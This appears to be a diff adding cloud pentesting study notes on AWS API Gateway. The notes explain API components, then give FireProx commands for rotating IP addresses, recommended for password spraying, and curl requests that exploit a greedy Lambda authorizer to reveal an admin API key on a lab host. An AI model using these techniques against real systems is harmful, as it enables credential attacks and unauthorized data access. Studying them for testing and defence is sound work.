@@ -1,0 +1,103 @@
+AWS API Gateway
+Introduction: The purpose of the APIs is provide a granular mechanism for developers to allow user access to (potentially) sensitive "back-end" resources. 
+Modern APIs often expose a number of sensitive "back-end" resources hosted on behalf of the API. These resources are often "micro-services" that proxy the user request as a direct database write or query to the various systems that may be supporting the API functionality
+
+1) API Components.
+
+- Endpoint: This is the URL location of the API, e.g., the address where you can "call" an API and the resources it can access on your behalf.
+
+- Method: This specifies the type of request being made to the API, such as GET, POST, PUT, DELETE, etc.
+
+- Headers: These are a component of HTTP, but are used by APIs to contain additional information about the request, such as authentication details, content type, and other metadata.
+
+- Request body: This is the data sent to the API as part of the request. GET requests won't typically have a request body, but POST, PUT, and DELETE requests almost always do.
+
+- Response: This is the data that the API sends in response to the request. It may include a status code, headers, and a response body.
+
+--------------------------------------------------------------------------------------------
+API Gateway Overview
+
+API Gateway essentially provides an API mechanism to attach to other AWS resources. That means when someone on the internet queries an API behind AWS API Gateway, they are commonly interacting with other AWS services or resources. 
+
+Lambda authorizers are custom code developed by the organization deploying the Gateway, and are arbitrarily configurable to make decisions based on any set of characteristics a developer may choose. When misconfigured, the code may allow unintended and unauthorized access to resources behind an API Gateway.
+
+--------------------------------------------------------------------------------------------
+Common Service Integrations with API Gateway
+
+1) Serverless Architecture: API Gateway can be integrated with AWS Lambda to build serverless applications, where the Lambda function is triggered by API Gateway to process incoming requests and return responses.
+
+2) Microservices: API Gateway can be used to create, deploy, and manage APIs for microservices, allowing for easier communication and integration between services. These "microservices" could be any server, container, or serverless function - along with a variety of services for messaging (SNS, SQS, EventBridge, etc.)
+
+3) Data storage and retrieval: API Gateway integrates with Amazon DynamoDB and Amazon S3 to provide seamless access to stored data.
+
+4) Real-time communication: API Gateway can be used with WebSockets to provide real-time, bidirectional communication between clients and servers.
+
+5) API Management: API Gateway provides tools for monitoring, logging, and managing APIs, making it easier to understand and control API usage.
+
+6) Security: API Gateway provides robust security features, including OAuth 2.0 and AWS Identity and Access Management (IAM) integration for access control, and SSL/TLS encryption for data in transit.
+
+-------------------------------------------------------------------------------------------
+Using API Gateway for Offensive Purposes
+
+To rotate IP addresses when using a proxy, one option is to use a rotating proxy service. This type of service automatically switches between a pool of proxy servers, ensuring that each request is sent from a different IP address
+
+Use FireProx!!
+FireProx is a tool designed to use AWS API Gateway for rotating your IP address when making web requests. It implements an API Gateway endpoint that redirects all requests to a configured domain or IP address. This capability has proven particularly useful for password spraying and similar credential attacks. 
+
+Clone and install the repository using the following commands:
+
+Command: git clone https://github.com/ustayready/fireprox
+Command: cd fireprox
+Command: pip3 install -r requirements.txt
+
+Executing the tool 
+Command: python fire.py (only list help)
+Command: python fire.py --command create --url https://api.bestcloudcompany.org
+
+Output: 
+[2025-09-25 19:23:05+00:00] (42wn8um7bi) fireprox_bestcloudcompany => https://42wn8um7bi.execute-api.us-east-1.amazonaws.com/fireprox/ (https://api.bestcloudcompany.org)
+
+List and delete endpoints
+Command: python fire.py --command list
+Command: python3 fire.py --command delete --api_id  42wn8um7bi
+
+Output: 
+Deleting 42wn8um7bi => Success!
+
+--------------------------------------------------------------------------------------------
+Attacking Lambda Authorizers on API Gateways
+
+The * wildcard in regex is a greedy operator that matches zero or more characters in a string. When used in matching URL paths, this can lead to unexpected matches if not used carefully. For example, a regex pattern with a greedy * might match more characters than intended, potentially matching parts of multiple URL paths. To avoid this, it's important to use grouping and lazy operators to control the match and ensure it only matches the intended portion of the URL path.
+
+Abusing Greedy expansion of lambda authorizers
+
+Lambda Authorizers in API Gateway are functions that provide authorization for API requests. They are used to control access to specific resources fronted by API Gateway, ensuring that only authorized users are able to access these resources. A Lambda Authorizer function is executed before an API request is processed, and it returns a policy document that specifies whether the request is authorized or not.
+
+Command: curl --header "header_value" https://api.bestcloudcompany.org/test/admin/
+Output: {"message":"Unauthorized"}
+
+Command: curl --header "authorizationToken:{provided_header_value}" https://api.bestcloudcompany.org/test/test/
+Output: {"Message":"User is not authorized to access this resource with an explicit deny in an identity-based policy"}
+
+Command: curl --header "header_value" https://api.bestcloudcompany.org/test/admin/
+Header value = authorizationToken:testing123
+
+With the previous Header value and using different paths /test/test or /test/admin
+Output: {"username": "test", "api_key": "testing123"}
+Output: {"username": "admin", "api_key": "2008951f220d4c8d9877bb979d560342"}
+
+References: https://docs.aws.amazon.com/apigateway/latest/developerguide/apigateway-use-lambda-authorizer.html
+https://github.com/ustayready/fireprox
+
+
+
+
+
+
+
+
+
+
+
+
+
